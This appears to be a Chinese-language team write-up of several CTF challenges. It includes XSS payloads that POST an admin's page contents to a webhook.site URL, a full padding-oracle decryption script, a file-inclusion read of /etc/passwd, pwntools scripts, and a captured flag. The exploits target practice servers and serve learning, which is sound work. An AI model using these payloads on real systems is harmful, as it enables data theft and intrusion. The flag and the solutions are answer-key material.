###### tags: `ctf`
# Final write_up

## ID
給我幅累格(李承祐、李柏諺、林文郁、劉其萱)

## zerostorage Flag_A

本題因為有所samsite，所以要只能從自己的同源網站才能接收到cookie，我在第一天解這題的時候，是用111這個帳號，密碼也是111，本題是要成為好友之後，才能看到好友的資料，原本是送document.cookie，但是好像收不到，所以似乎不是這樣解? 但是第三天我發現已經跟admin變成朋友了，可能我的111帳號被盜了，或是有其他已經成為好友的人把我加 成好友了，然後就送出上面的javascript，然後命名成.html上傳到server，再餵生成的網址給我們的admin，admin點下去後就會觸發js，就可以加其他人好友了~
```htmlmixed=
<script>
	fetch('http://zero-storage-eof-ctf.csie.org:1310/befriend?friend_name=111')
	.then(response => response.text())
	.then(data => fetch(
    'https://webhook.site/e5738207-bd53-4ac3-bbc3-782718d55768'
    ,{method:'POST', body:data}));
</script>
```
可以看到我可以讓別人變成admin的朋友
![](https://i.imgur.com/TFzXJ63.png)
之後在使用以下的script，去看admin的主頁，就可以看到admin的filename~
```htmlmixed=
<script>
	fetch('http://zero-storage-eof-ctf.csie.org:1310/home')
	.then(response => response.text())
	.then(data => fetch(
    'https://webhook.site/e5738207-bd53-4ac3-bbc3-782718d55768'
    ,{method:'POST', body:data}));
</script>
```
可以看到回傳的filename是masAAkiXXX.txt
![](https://i.imgur.com/MNKO4cI.png)
因為已經是朋友了，所以就直接去看這個txt就可以看到flag了~
![](https://i.imgur.com/HTpfGcH.png)


## EDUshell
本題的洞是再exec那有一大段mmap會去生成一大段memory並且可以wrx裡面的指令，那一看就知道是要我們插shellcode去拿flag，而這題的flag會被loadflag到程式內的一段bss中，之後馬上call exec我們的shellcode去執行，原本想說要用write去把那段位置的東西拿出來，直接stout印出來，但似乎seccomp有鎖write的sys_call，好像不能這樣解，所以就卡住了，後來有想到去rbx把pie的address leak出來後，直接把所有的ascii都寫進去，再暴力去一一比對爆破，但沒在能間內做出這題出來。

## Chatroom
1. 首先仔細看source code，可以知道是用Blowfish的CBC模式加密，而且padding方式是Byte都補\x00
```python=
def pad(m: bytes):
    padlen = 8 - len(m) % 8
    return m + bytes([0] * padlen)
```

2. 再來看到encrypt的function
```python=
def encrypt(m: bytes):
    fish = Blowfish.new(key, Blowfish.MODE_CBC)
    return fish.iv + fish.encrypt(pad(m))
```
可以看到加密完會回傳iv和cipher

3. 這行會顯示出剛剛的iv+cipher+md5後的值
```python=
print(f'聊天室房間號碼: {encrypt(flag).hex()}{md5(flag).hexdigest()}')
```

4. 取出iv、cipher
```python=
res = r.recvuntil('\n系統訊息: 加密連線完成，開始聊天囉！',drop = True)[24:]
cipher = bytes.fromhex(res.decode())
leng = len(cipher)
iv = cipher[:8] #8bytes
Cipher = cipher[:leng-16] #iv+block共32 bytes
md5 = cipher[leng-16:] #後面16bytes是md5
```
觀察res可以發現,後面16bytes的值都不會變,所以推測後面16bytes是md5
由於blowfish的block size是8bytes
前8bytes是iv
cipher共長32bytes(含iv)

5. 再來看剩下的code
```python=
def main():
    print('===== 免費寂寞交友聊天室，24 小時真人在線聊天 =====')
    print(f'聊天室房間號碼: {encrypt(flag).hex()}{md5(flag).hexdigest()}')
    while True:
        print('系統訊息: 加密連線完成，開始聊天囉！')
        while True:
            word = input('輸入訊息: ')
            word = decrypt(bytes.fromhex(word))
            try:
                word = word.decode('utf-8')
                if '男' in word:
                    print('系統訊息: 對方離開了，請按離開按鈕回到首頁')
                    break
                else:
                    print('陌生人: 哈哈哈哈')
            except UnicodeDecodeError as e:
                print(f'系統訊息: {encrypt(str(e).encode()).hex()}')

try:
    main()
except:
    print('系統訊息: 我掛了')
```
猜測`print('陌生人: 哈哈哈哈')和print('系統訊息: 對方離開了，請按離開按鈕回到首頁')`應該就是padding正確的話會回傳的值
所以oracle裡面打:
```python=
def oracle(c):
    #print("iv前16個值 =",c[:16],"block= ",c[16:])
    #r.sendlineafter('輸入訊息',input())
    sin = r.recvuntil('輸入訊息: ')
    #print(sin.decode("utf-8"),c.hex())
    r.sendline(c.hex())
    if "陌生人: 哈哈哈哈".encode("utf-8") in r.recvline():
        return True
    elif "系統訊息: 對方離開了，請按離開按鈕回到首頁".encode("utf-8") in r.recvline():
        return True
    else:
        return False
```

6. 然後開始padding oracle attack:

#### ================================ 我是分隔線 ================================

**_但是做到這裡發現我沒有做randomize block，把前面的block變成random bytes，所以就從頭想了一次_**
#### ================================ 我是分隔線 ================================

基本上要做的是就是讓xor出來的東西有個'男'在裡面，然後解blowfish CBC, 然後再xor解回明文。
但是在解的時候有遇到時間複雜度的問題，解3個byte要2^24次query，然後server在暴力解的時候會因為嘗試太多次就強制斷線，所以要另外找辦法。

在研究完utf-8的編碼之後，把時間複雜度降到2^16次方。


```python=
### POA function is dealing with block decryption

otoko = '男'.encode('utf-8')

def POA(this, remote_server):
        block_len = 8
        # recv data from remote server
        cipher = remote_server.recv(1024).decode('utf-8')
        print(cipher)
        cipher = bytearray.fromhex(cipher[43:43+64])
        this.cipher = cipher
        cipher_len = len(cipher)
        p = bytearray(cipher_len - block_len)
        c = bytearray(cipher)
        this.c = c
        this.plain = p
        print((cipher.hex() + '\n'))
        print((c.hex() + '\n'))
        # go through all the cipher block
        for block in range(int(cipher_len/block_len) - 2, -1, -1):
            for idx in 7, 4, 2:
                u = 0
                print(cipher[block_len*block: block_len*(block+1)].hex())
                ### Go through all the possible answer
                for val in range(0x20):
                    for b5 in range(0x20):
                        c[idx + block_len*block] = (cipher[idx + block_len*block] & 0x80 ^ 0x80) + ((val & 0x1) << 6)
                        c[idx + block_len*block - 1] = (cipher[idx + block_len*block - 1] & 0x80 ^ 0x80) + ((val & 0x2) << 5) + ((b5 & 0x1) << 5)
                        c[idx + block_len*block - 2] = (cipher[idx + block_len*block - 2] & 0x80 ^ 0x80) + ((val & 0x1C) << 2) + (b5 >> 1)
                        remote_server.sendall((c[block_len * block: block_len * (2+block)].hex() + '\n').encode('utf-8'))
                        yon = remote_server.recv(4096)
                        if((yon[14] ^ 0xE0) >> 4 == 0):
                            u= val
                            break
                print(u)
                
                for val in range(0x10000):
                    c[idx + block_len*block] = (cipher[idx + block_len*block] & 0x80 ^ 0x80) + ((u & 0x1) << 6) +  (val & 0x3F)
                    c[idx + block_len*block - 1] = (cipher[idx + block_len*block - 1] & 0x80 ^ 0x80) + ((u & 0x2) << 5) + ((val & 0xFC0) >> 6)
                    c[idx + block_len*block - 2] = (cipher[idx + block_len*block - 2] & 0x80 ^ 0x80) + ((u & 0x1C) << 2) + ((val & 0xF000) >> 12)
                    remote_server.sendall((c[block_len * block: block_len * (2+block)].hex() + '\n').encode('utf-8'))
                    yon = remote_server.recv(4096)
                    if((yon[14] ^ 0xE0) >> 4 != 0):
                        continue
                    
                    ### is this is the correct answer, print the plaintext of this block
                    if yon[14: 14+3].decode('utf-8') == '對':
                        print(yon)
                        find = True
                        p[idx + block_len*block] = c[idx + block_len*block] ^ cipher[idx + block_len*block] ^ otoko[2]
                        p[idx + block_len*block - 1] = c[idx + block_len*block - 1] ^ cipher[idx + block_len*block - 1] ^ otoko[1]
                        p[idx + block_len*block - 2] = c[idx + block_len*block - 2] ^ cipher[idx + block_len*block - 2] ^ otoko[0]
                        break
                print(p[idx + block_len*block - 2: idx + block_len*block + 1])
                c[block_len*block : block_len * (block+1)] = cipher[block_len*block : block_len * (block+1)]
        print(unpad(p).decode())

```
```python=
### this is the unpad function
def unpad(data):
	for i in range(len(data) - 1, len(data) - 1 - 8, -1):
		if data[i] != 0x00:
			return data[:i+1]

```

解題截圖

![](https://i.imgur.com/Et9RO0n.png)

![](https://i.imgur.com/efRDEZl.png)

![](https://i.imgur.com/b2xWyR6.png)


command line下指令：
```python=
% python3 chat_room.py
```

FLAG
```python=
FLAG{0r4cL3_nEVeR_D1e}
```

## CYBERPUNK 1977
這一題打開是個登入頁面，裡面有hint page跟忘記是什麼了＠＠

在hint page的時候，我把後面的file換成file=passwd，就得到了一個passwd檔，內容如下。
```bash=
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false
```

但是從內容看不出其他端倪，接著去看他的檔案結構，原本是想直接去看source code，但發現會在app底下有禁止看.py檔，所以就卡在這裡了。

## JWang's Terminal

一開始拿到程式他說少了一些 dll
上網 Google 了一下發現是 QT 的 dll
所以我去安裝 QT 然後把 dll 抓過來放到 exe 旁邊就可以跑了

接著程式跑出一個像 terminal 的輸入
我就隨便試一下`ls`
結果就閃退了
所以我把它丟進 IDA
看了才知道原來是要用 CMD 的指令`dir`、`cd`和`type`
稍微逛了一下發現裡面有一些 ASCII ART 的圖片
所以我就猜 FLAG 是 ASCII ART
因此我用 PWNTOOLS + WINE 寫了一個暴力搜尋每一張圖片的 `j_wang1.py`
```python=
from pwn import *
import time

picLoc = []

def recallAndGoToDic( pwd):
    r = process(['wine', 'jwangsTerminal.exe'])
    print( 'Recover', pwd[0:-1])
    for dic in pwd[0:-1]:
        r.sendafter('terminal ---> ', 'cd '+ dic +'\r\n')
    r.sendafter('terminal ---> ', 'dir\r\n')
    return r

def step( r, pwd, fileName):
    print( 'at', pwd)
    r.sendafter('terminal ---> ', 'dir\r\n')
    s = r.recvuntil('hacker').decode()
    s = s.split('\r\n')[0:-1]
    print( 'there are', s )
    if s == []:
        picLoc.append(pwd)
        r.sendafter('terminal ---> ', 'cd ..\r\n')
        r.sendafter('terminal ---> ', 'type '+ fileName +'\r\n')
        time.sleep(1)
        if r.poll()!=None:
            r = recallAndGoToDic(pwd)
            return r
        else:
            picture = r.recvuntil('hacker', timeout=1).decode()
            print( picture[0:-6], pwd+[fileName] )
            return r
        
    for dic in s:
        print( pwd, dic)
        r.sendafter('terminal ---> ', 'cd '+ dic +'\r\n')
        r = step( r, pwd+[dic], dic)
    r.sendafter('terminal ---> ', 'cd ..\r\n')
    return r

r = process(['wine', 'jwangsTerminal.exe'])

pwd = []
step( r, pwd, 'root')
```
然後用肉眼一張一張圖片看
> 累.jpg

最後終於在
```
/5RQLN/yjnhgR/9QEAWXml/hoZvaNFK/2z8X5uX/tuYZ/f1NJLH4EQ/xWK4/
avMLZZC/QCE6o1/Uwru/KK4ayc/WJdjRA/k7naysb2/ORWk/lWDai/714KGBed/
3cqU1L1/RtKMmar20/ebdUtc/kSsb/
```
裡面`type lBq5NknLuUW`
找到了FLAG
![](https://i.imgur.com/Z6bGGWV.png)
但它被隱藏起來了

我嘗試過用x64dbg騙它說檔案是`README.txt`但沒用
然後時間就到了

---

後來我想說把它存下來嘗試解密看看
結果...
![](https://i.imgur.com/DD6Hcwu.png)

程式碼：
```python=
from pwn import *

r = process(['wine', 'jwangsTerminal.exe'])

def recallAndGoToDic( pwd):
    print( 'Recover', pwd[0:-1])
    for dic in pwd[0:-1]:
        r.sendafter('terminal ---> ', 'cd '+ dic +'\r\n')
    r.sendafter('terminal ---> ', 'dir\r\n')
    
pwd = ['5RQLN', 'yjnhgR', '9QEAWXml', 'hoZvaNFK', '2z8X5uX',
'tuYZ', 'f1NJLH4EQ', 'xWK4', 'avMLZZC', 'QCE6o1', 'Uwru',
'KK4ayc', 'WJdjRA', 'k7naysb2', 'ORWk', 'lWDai', '714KGBed',
'3cqU1L1', 'RtKMmar20', 'ebdUtc', 'kSsb', 'lBq5NknLuUW']
recallAndGoToDic(pwd)
r.sendafter('terminal ---> ', 'type lBq5NknLuUW\r\n')
f = open( 'b', 'w+')
ss = r.recvuntil('hacker')[0:-1]
s = ''
for i in ss:
    s += chr(i)
f.write(s)
f.close()
r.interactive()
```